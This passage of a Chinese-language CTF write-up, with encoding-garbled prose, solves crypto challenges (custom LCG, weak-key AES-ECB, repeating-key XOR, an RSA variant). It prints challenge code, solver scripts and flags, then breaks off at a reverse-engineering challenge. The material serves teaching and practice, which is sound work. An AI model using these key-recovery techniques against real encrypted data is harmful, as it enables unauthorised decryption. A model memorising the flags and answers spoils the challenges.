class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">assert</span> flag[:<span class="number">5</span>] == <span class="string">b&#x27;cazy&#123;&#x27;</span></span><br><span class="line"><span class="keyword">assert</span> flag[-<span class="number">1</span>:] == <span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line">flag = flag[<span class="number">5</span>:-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(flag) == <span class="number">24</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">my_LCG</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, seed1 , seed2</span>):</span><br><span class="line">        self.state = [seed1,seed2]</span><br><span class="line">        self.n = getPrime(<span class="number">64</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">            self.a = bytes_to_long(flag[:<span class="number">8</span>])</span><br><span class="line">            self.b = bytes_to_long(flag[<span class="number">8</span>:<span class="number">16</span>])</span><br><span class="line">            self.c = bytes_to_long(flag[<span class="number">16</span>:])</span><br><span class="line">            <span class="keyword">if</span> self.a &lt; self.n <span class="keyword">and</span> self.b &lt; self.n <span class="keyword">and</span> self.c &lt; self.n:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>):</span><br><span class="line">        new = (self.a * self.state[-<span class="number">1</span>] + self.b * self.state[-<span class="number">2</span>] + self.c) % self.n</span><br><span class="line">        self.state.append( new )</span><br><span class="line">        <span class="keyword">return</span> new</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    lcg = my_LCG(getRandomInteger(<span class="number">64</span>),getRandomInteger(<span class="number">64</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;data = &quot;</span> + <span class="built_in">str</span>([lcg.<span class="built_in">next</span>() <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;n = &quot;</span> + <span class="built_in">str</span>(lcg.n))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main() </span><br><span class="line"></span><br><span class="line"><span class="comment"># data = [2626199569775466793, 8922951687182166500, 454458498974504742, 7289424376539417914, 8673638837300855396]</span></span><br><span class="line"><span class="comment"># n = 10104483468358610819</span></span><br></pre></td></tr></table></figure></blockquote><p>é­”æ”¹ä¸‰å‚æ•°LCGï¼Œåˆ©ç”¨æ»¡è¶³çš„å…¬å¼ $as_{i-1}+bs_{i-2}+c \equiv s_i \pmod n$ï¼Œå¾—åˆ°ä¸‰å…ƒä¸€æ¬¡åŒä½™æ–¹ç¨‹ç»„ï¼Œåˆ©ç”¨GrÃ¶bneråŸºæ±‚è§£ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">d = [<span class="number">2626199569775466793</span>, <span class="number">8922951687182166500</span>, <span class="number">454458498974504742</span>, <span class="number">7289424376539417914</span>, <span class="number">8673638837300855396</span>]</span><br><span class="line">n = <span class="number">10104483468358610819</span></span><br><span class="line">PR.&lt;a,b,c&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f1 = (a*d[<span class="number">1</span>]+b*d[<span class="number">0</span>]+c-d[<span class="number">2</span>])</span><br><span class="line">f2 = (a*d[<span class="number">2</span>]+b*d[<span class="number">1</span>]+c-d[<span class="number">3</span>])</span><br><span class="line">f3 = (a*d[<span class="number">3</span>]+b*d[<span class="number">2</span>]+c-d[<span class="number">4</span>])</span><br><span class="line">Fs = [f1, f2, f3]</span><br><span class="line">I = Ideal(Fs)</span><br><span class="line">B = I.groebner_basis()</span><br><span class="line">m = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> B:</span><br><span class="line">    <span class="keyword">assert</span> b.degree() == <span class="number">1</span></span><br><span class="line">    mi = ZZ(-b(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">    m += <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(mi)[<span class="number">2</span>:])</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;L1near_Equ4t1on6_1s_34sy&#x27;</span></span><br></pre></td></tr></table></figure><p>æ‹¼æ¥ï¼š<code>cazy&#123;L1near_Equ4t1on6_1s_34sy&#125;</code></p><p>â€‹    </p><h3 id="no-can-no-bb"><a href="#no-can-no-bb" class="headerlink" title="no_can_no_bb"></a>no_can_no_bb</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> flag[:<span class="number">5</span>] ==<span class="string">b&#x27;cazy&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">m</span>):</span><br><span class="line">    tmp = <span class="number">16</span>-(<span class="built_in">len</span>(m)%<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> m + <span class="built_in">bytes</span>([tmp <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(tmp)])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">m,key</span>):</span><br><span class="line">    aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line">    <span class="keyword">return</span> aes.encrypt(m)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    flag = pad(flag)</span><br><span class="line">    key = pad(long_to_bytes(random.randrange(<span class="number">1</span>,<span class="number">1</span>&lt;&lt;<span class="number">20</span>)))</span><br><span class="line">    c = encrypt(flag,key)</span><br><span class="line">    <span class="built_in">print</span>(c)</span><br><span class="line"><span class="comment"># b&#x27;\x9d\x18K\x84n\xb8b|\x18\xad4\xc6\xfc\xec\xfe\x14\x0b_T\xe3\x1b\x03Q\x96e\x9e\xb8MQ\xd5\xc3\x1c&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>randomèŒƒå›´ä¸å¤§ï¼Œçˆ†ç ´keyè§£AES-ECBï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">x</span>):</span><br><span class="line">    tmp = <span class="number">16</span>-(<span class="built_in">len</span>(x)%<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> x + <span class="built_in">bytes</span>([tmp <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(tmp)])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">c,key</span>):</span><br><span class="line">    aes = AES.new(key,AES.MODE_ECB)</span><br><span class="line">    <span class="keyword">return</span> aes.decrypt(c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>&lt;&lt;<span class="number">20</span>):</span><br><span class="line">        key = pad(long_to_bytes(i))</span><br><span class="line">        c = <span class="string">b&#x27;\x9d\x18K\x84n\xb8b|\x18\xad4\xc6\xfc\xec\xfe\x14\x0b_T\xe3\x1b\x03Q\x96e\x9e\xb8MQ\xd5\xc3\x1c&#x27;</span></span><br><span class="line">        m = decrypt(c,key)</span><br><span class="line">        <span class="keyword">if</span> m.startswith(<span class="string">b&#x27;cazy&#123;&#x27;</span>):</span><br><span class="line">            <span class="built_in">print</span>(m)</span><br><span class="line">            </span><br><span class="line"><span class="comment"># b&#x27;cazy&#123;n0_c4n,bb?n0p3!&#125;\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="no-cry-no-can"><a href="#no-cry-no-can" class="headerlink" title="no_cry_no_can"></a>no_cry_no_can</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag,key</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(key) &lt;= <span class="number">5</span></span><br><span class="line"><span class="keyword">assert</span> flag[:<span class="number">5</span>] == <span class="string">b&#x27;cazy&#123;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">can_encrypt</span>(<span class="params">flag,key</span>):</span><br><span class="line">    block_len = <span class="built_in">len</span>(flag) // <span class="built_in">len</span>(key) + <span class="number">1</span></span><br><span class="line">    new_key = key * block_len</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([i^j <span class="keyword">for</span> i,j <span class="keyword">in</span> <span class="built_in">zip</span>(flag,new_key)])</span><br><span class="line"></span><br><span class="line">c = can_encrypt(flag,key)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;&lt;pH\x86\x1a&amp;&quot;m\xce\x12\x00pm\x97U1uA\xcf\x0c:NP\xcf\x18~l&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>keyä¸º5ä½ï¼Œå·²çŸ¥flagå¤´5ä½ï¼Œä¸å¯†æ–‡å¼‚æˆ–å¾—<code>key = b&#39;\x5f\x11\x32\xff\x61&#39;</code>ï¼Œå†å¼‚æˆ–å¯†æ–‡è¿˜åŸæ˜æ–‡ï¼š</p><p><code>cazy&#123;y3_1s_a_h4nds0me_b0y!&#125;</code></p><p>â€‹    </p><h3 id="no-math-no-cry"><a href="#no-math-no-cry" class="headerlink" title="no_math_no_cry"></a>no_math_no_cry</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) &lt;= <span class="number">80</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sec_encry</span>(<span class="params">m</span>):</span><br><span class="line">    cip = (m - (<span class="number">1</span>&lt;&lt;<span class="number">500</span>))**<span class="number">2</span> + <span class="number">0x0338470</span></span><br><span class="line">    <span class="keyword">return</span> cip</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    m = bytes_to_long(flag)</span><br><span class="line">    c = sec_encry(m)</span><br><span class="line">    <span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 10715086071862673209484250490600018105614048117055336074437503883703510511248211671489145400471130049712947188505612184220711949974689275316345656079538583389095869818942817127245278601695124271626668045250476877726638182396614587807925457735428719972874944279172128411500209111406507112585996098530169</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></blockquote><p>ç®€å•é€†å›å»å°±å¥½ï¼Œæ³¨æ„ä¸€ä¸‹å¼€æ–¹å–è´Ÿå€¼ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">c = <span class="number">10715086071862673209484250490600018105614048117055336074437503883703510511248211671489145400471130049712947188505612184220711949974689275316345656079538583389095869818942817127245278601695124271626668045250476877726638182396614587807925457735428719972874944279172128411500209111406507112585996098530169</span></span><br><span class="line">c -= <span class="number">0x0338470</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">m = -gmpy2.iroot(c,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m+(<span class="number">1</span>&lt;&lt;<span class="number">500</span>))[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;cazy&#123;1234567890_no_m4th_n0_cRy&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="math"><a href="#math" class="headerlink" title="math"></a>math</h3><blockquote><p>æ•°å­¦æœ€é‡è¦çš„å°±æ˜¯æ¨å¯¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pinvq:<span class="number">0x63367a2b947c21d5051144d2d40572e366e19e3539a3074a433a92161465543157854669134c03642a12d304d2d9036e6458fe4c850c772c19c4eb3f567902b3</span></span><br><span class="line">qinvp:<span class="number">0x79388eb6c541fffefc9cfb083f3662655651502d81ccc00ecde17a75f316bc97a8d888286f21b1235bde1f35efe13f8b3edb739c8f28e6e6043cb29569aa0e7b</span></span><br><span class="line">c:<span class="number">0x5a1e001edd22964dd501eac6071091027db7665e5355426e1fa0c6360accbc013c7a36da88797de1960a6e9f1cf9ad9b8fd837b76fea7e11eac30a898c7a8b6d8c8989db07c2d80b14487a167c0064442e1fb9fd657a519cac5651457d64223baa30d8b7689d22f5f3795659ba50fb808b1863b344d8a8753b60bb4188b5e386</span></span><br><span class="line">e:<span class="number">0x10005</span></span><br><span class="line">d:<span class="number">0xae285803302de933cfc181bd4b9ab2ae09d1991509cb165aa1650bef78a8b23548bb17175f10cddffcde1a1cf36417cc080a622a1f8c64deb6d16667851942375670c50c5a32796545784f0bbcfdf2c0629a3d4f8e1a8a683f2aa63971f8e126c2ef75e08f56d16e1ec492cf9d26e730eae4d1a3fecbbb5db81e74d5195f49f1</span></span><br></pre></td></tr></table></figure></blockquote><p>ç»™å‡º $x=\text{inv}(p,q),y=\text{inv}(q,p),e,d,c$ã€‚</p><p>è¯¦ç»†æ¨å¯¼æ€è·¯å¯å‚è€ƒ <a href="https://github.com/pcw109550/write-up/tree/master/2019/HITCON/Lost_Modulus_Again">HITCON 2019 - Lost Modulus Again</a>ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">alpha = p&#x27; * q&#x27; - l</span></span><br><span class="line"><span class="string">beta = l^2 * [(e * d - 1) / s] + q&#x27; * l + p&#x27; * l - p&#x27; * q&#x27; - alpha - l^2</span></span><br><span class="line"><span class="string">i.e.:</span></span><br><span class="line"><span class="string">beta = l^2 * &#123;[(e * d - 1) / s] - 1&#125; + l * (q&#x27; + p&#x27;) - alpha - p&#x27; * q&#x27;</span></span><br><span class="line"><span class="string">if l,s are correct:</span></span><br><span class="line"><span class="string">    alpha = k * t</span></span><br><span class="line"><span class="string">    beta = k * (p&#x27; - l) + t * (q&#x27; - l)</span></span><br><span class="line"><span class="string">i.e:</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alpha_from_pprime_qprime_l</span>(<span class="params">pprime, qprime, l</span>):</span><br><span class="line">    <span class="keyword">return</span> pprime*qprime - l</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">beta_from_pprime_qprime_e_d_l_s_alpha</span>(<span class="params">pprime, qprime, e, d, l, s, alpha</span>):</span><br><span class="line">    temp1 = e*d - <span class="number">1</span></span><br><span class="line">    <span class="keyword">assert</span> temp1 % s == <span class="number">0</span></span><br><span class="line">    temp2 = ((temp1 // s) - <span class="number">1</span>) * l * l</span><br><span class="line">    temp3 = temp2 + l * (pprime + qprime)</span><br><span class="line">    <span class="keyword">return</span> temp3 - alpha - (pprime*qprime)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">k_t_from_pprime_qprime_l_alpha_beta</span>(<span class="params">pprime, qprime, l, alpha, beta</span>):</span><br><span class="line">    a = pprime - l</span><br><span class="line">    b = -beta</span><br><span class="line">    c = alpha * (qprime - l)</span><br><span class="line">    disc = b * b - <span class="number">4</span> * a * c</span><br><span class="line">    <span class="keyword">assert</span> gmpy2.is_square(disc)</span><br><span class="line">    temp = -b + gmpy2.isqrt(disc)</span><br><span class="line">    <span class="keyword">assert</span> temp % (<span class="number">2</span>*a) == <span class="number">0</span></span><br><span class="line">    k = temp // (<span class="number">2</span>*a) </span><br><span class="line">    <span class="keyword">assert</span> alpha % k == <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> k, alpha // k</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_k_t_l</span>(<span class="params">pprime, qprime, e, d</span>):</span><br><span class="line">    </span><br><span class="line">   <span class="comment"># l, s = 2, 2</span></span><br><span class="line"></span><br><span class="line">    ss = [s <span class="keyword">for</span> s <span class="keyword">in</span> <span class="built_in">range</span>(e - <span class="number">100000</span>, e + <span class="number">1000000</span>) <span class="keyword">if</span> s!=<span class="number">0</span> <span class="keyword">and</span> (e*d - <span class="number">1</span>) % s == <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> l, s <span class="keyword">in</span> product(<span class="built_in">range</span>(<span class="number">1</span>, <span class="number">5000</span>), ss):</span><br><span class="line">        <span class="comment">#print(f&#x27;l = &#123;l&#125;, s = &#123;s&#125;&#x27;)</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            alpha = alpha_from_pprime_qprime_l(pprime, qprime, l)</span><br><span class="line">            beta = beta_from_pprime_qprime_e_d_l_s_alpha(pprime, qprime, e, d, l, s, alpha)</span><br><span class="line">            k, t = k_t_from_pprime_qprime_l_alpha_beta(pprime, qprime, l, alpha, beta)</span><br><span class="line">            <span class="keyword">return</span> k, t, l</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> AssertionError:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    e = <span class="number">0x10005</span></span><br><span class="line">    <span class="comment">#fn = 15743369066365201538689815141217340316571238013087670610561037355773525976258683589473338312326667266426637983360891507450086948913791067841805124377899989037485326133436719169246977060981737084689604571176180431464103979969894191079926052092838806338413905561857239072404009236751128582547515118141940600672935405990869984053032765764114050729270669601890847900632843688927485888918612911073502700067125045327489296133801029104137634700096205588495179191062622618039322093662364377472003903899926787818853067801269953347284657645644433840226628368651915623156258190141632506503179281547840336415021260912890513317032</span></span><br><span class="line">    d = <span class="number">0xae285803302de933cfc181bd4b9ab2ae09d1991509cb165aa1650bef78a8b23548bb17175f10cddffcde1a1cf36417cc080a622a1f8c64deb6d16667851942375670c50c5a32796545784f0bbcfdf2c0629a3d4f8e1a8a683f2aa63971f8e126c2ef75e08f56d16e1ec492cf9d26e730eae4d1a3fecbbb5db81e74d5195f49f1</span></span><br><span class="line">    pprime = <span class="number">0x63367a2b947c21d5051144d2d40572e366e19e3539a3074a433a92161465543157854669134c03642a12d304d2d9036e6458fe4c850c772c19c4eb3f567902b3</span></span><br><span class="line">    qprime = <span class="number">0x79388eb6c541fffefc9cfb083f3662655651502d81ccc00ecde17a75f316bc97a8d888286f21b1235bde1f35efe13f8b3edb739c8f28e6e6043cb29569aa0e7b</span></span><br><span class="line">    k, t, l = brute_k_t_l(pprime, qprime, e, d)</span><br><span class="line"></span><br><span class="line">    lp, lq = qprime + k, pprime + t</span><br><span class="line">    <span class="keyword">assert</span> lp % l == <span class="number">0</span>, lq % l == <span class="number">0</span></span><br><span class="line">    p, q = lp // l, lq // l</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">assert</span> gmpy2.invert(p, q) == pprime, gmpy2.invert(q, p) == qprime</span><br><span class="line">    <span class="keyword">assert</span> gmpy2.is_prime(p), gmpy2.is_prime(q)</span><br><span class="line">    N = p*q</span><br><span class="line"></span><br><span class="line">    c = <span class="number">0x5a1e001edd22964dd501eac6071091027db7665e5355426e1fa0c6360accbc013c7a36da88797de1960a6e9f1cf9ad9b8fd837b76fea7e11eac30a898c7a8b6d8c8989db07c2d80b14487a167c0064442e1fb9fd657a519cac5651457d64223baa30d8b7689d22f5f3795659ba50fb808b1863b344d8a8753b60bb4188b5e386</span></span><br><span class="line">    flag_decoded = <span class="built_in">pow</span>(c, d, N)</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(flag_decoded))</span><br><span class="line">    </span><br><span class="line"><span class="comment"># b&#x27;flag&#123;c4617a206ba83d7f824dc44e5e67196a&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="lemon"><a href="#lemon" class="headerlink" title="lemon"></a>lemon</h3><blockquote><p>reç­¾åˆ°é¢˜ï¼Œæ ¼å¼ï¼šflag{output}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span 